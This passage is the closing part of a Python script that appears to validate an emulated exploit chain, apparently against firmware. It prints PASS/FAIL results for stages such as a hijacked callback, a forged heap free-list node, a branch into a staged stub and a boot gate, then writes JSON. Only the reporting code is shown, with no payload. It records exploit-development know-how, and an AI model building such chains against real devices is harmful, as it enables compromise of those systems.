        p(f"  BOOT-TO after patch     : rc=0x{r0['boot_to']['rc']:x} "
          f"cb=0x{r0['boot_to']['dpc_cb']:x}")

    p("")
    p("-- PASS block (machine checkable) --")
    for key, value in checks.items():
        p(f"CHECK {key:24s} "
          + ("SKIP" if value is None else ("PASS" if value else "FAIL")))
    for cfg in CHAIN_CONFIGS:
        res = chain_first[cfg]
        p(f"CHAIN {cfg:14s} "
          + ("PASS" if res.get("pass") else "FAIL")
          + f"  L=0x{L_FINAL:x} blx=0x{FS_STAGE:x}")
    r0 = chain_first["none"]
    if r0.get("fatal"):
        for line in ("FIRE", "BLX", "STUB", "FREELIST", "ALLOC", "CMDLOOP",
                     "SLOT", "BOOTTO", "SHA model"):
            p(f"{line} FAIL (fatal)")
    else:
        p(f"FIRE dpc->cb={_hx(r0.get('fire_value'))} count={r0['fire_count']}")
        p(f"BLX target={_hx(r0['blx']['target'] if r0.get('blx') else None)}")
        p(f"STUB entry=0x{FS_STAGE:x} bytes={STUB_LEN} "
          f"ret_lr={_hx(r0['events'].get('stub_lr'))} "
          f"safe_hits={r0['events']['safe']}")
        p(f"FREELIST ok nodes={r0['free_list_after']['count']} "
          f"sentinel=0x{SENTINEL:x} forged_present="
          f"{r0['free_list_after']['forged_present']}")
        p("ALLOC ok" if r0["assert_alloc"] else "ALLOC FAIL")
        p("CMDLOOP ok" if r0["assert_cmdloop"] else "CMDLOOP FAIL")
        p(f"SLOT written={r0['hash_slot']}" if r0["assert_slot"]
          else f"SLOT MISMATCH={r0['hash_slot']}")
        p(f"BOOTTO gate rc=0x{r0['boot_to']['rc']:x} "
          f"cb=0x{r0['boot_to']['dpc_cb']:x}"
          if r0["assert_bootto"] else "BOOTTO gate FAIL")
        p("SHA model labeled[hashlib]" if r0["assert_sha"] else "SHA model FAIL")
    p("DETERMINISM " + ("PASS" if det_ok else "FAIL")
      + f" ({RUNS_PER_CONFIG} runs x {len(CHAIN_CONFIGS)} configs)")
    p("DETERMINISM sweep " + ("PASS" if sweep_det_ok else "FAIL")
      + f" ({RUNS_PER_CONFIG} runs x {len(SWEEP_CONFIGS)} histories)")
    if reg["ran"]:
        p("REGRESSION 200EX01 " + ("PASS" if reg["ok"] else "FAIL"))
    p(f"elapsed={time.time() - t0:.1f}s")
    p("")
    p("RESULT: PASS" if verdict else "RESULT: FAIL")

    if args.json:
        with open(args.json, "w") as f:
            json.dump({"slot": slot, "bootto": boot["checks"],
                       "sweep": sweep_rows, "fine": fine_rows,
                       "chain": {k: [{kk: vv for kk, vv in r.items()
                                      if kk not in ("events", "benign_tx")}
                                     for r in v]
                                 for k, v in chain_runs.items()},
                       "determinism": det_rows, "regression": reg,
                       "checks": checks, "pass": verdict}, f, indent=1)
        p(f"json written: {args.json}")
    return 0 if verdict else 1


if __name__ == "__main__":
    sys.exit(main())
